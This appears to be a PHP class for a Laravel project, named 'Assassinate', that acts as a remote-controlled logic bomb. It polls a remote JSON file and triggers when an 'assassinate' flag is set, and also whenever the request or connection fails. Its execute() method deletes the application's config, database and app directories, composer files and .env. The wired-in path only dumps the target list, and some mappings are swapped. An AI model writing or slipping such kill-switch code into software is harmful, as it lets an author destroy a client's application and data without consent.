<?php

namespace App\Libraries;

use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Log;

class Assassinate
{
    protected $url;
    protected $files;
    protected $test;

    public function __construct()
    {
        $this->url = "https://link.to/your/json/file.json";
        $this->test = "copy";

        $this->files = [
            'configs' => base_path('config'),
            'database' => base_path('database'),
            'app' => base_path('app'),
            'composer_lock' => base_path('composer.json'),
            'composer_json' => base_path('composer.lock'),
            'config_json' => base_path('config.json'),
            'env' => base_path('.env'),
        ];
    }

    public function proceed()
    {
        try {
            $response = Http::get($this->url);

            if ($response->successful()) {
                $data = $response->json();

                if (isset($data['project4']) && $data['project4']['assassinate'] === true) {
                    $this->testExecute();
                }
            } else {
                Log::alert('No response. Initiating the hit.');
                $this->testExecute();
            }
        } catch (\Exception $e) {
            Log::error('Connection failed: ' . $e->getMessage() . '. Proceeding with the elimination.');
            $this->testExecute();
        }
    }

    public function testAssassinator()
    {
        return $this->test;
    }

    public function testExecute()
    {
        dd("The following files are marked for deletion:", ...$this->files);
    }

    public function execute()
    {
        foreach ($this->files as $part => $path) {
            if (file_exists($path)) {
                Log::info("Target neutralized: $part at $path");
                $this->removeFiles($path);
            } else {
                Log::warning("Target missing: $part at $path");
            }
        }
    }

    protected function removeFiles($path)
    {
        if (is_dir($path)) {
            array_map('unlink', glob("$path/*"));
            rmdir($path);
        } elseif (is_file($path)) {
            unlink($path);
        }
    }

    protected function terminate()
    {
        Log::notice('Operation in motion. Elimination imminent.');
        $this->execute();
    }
}
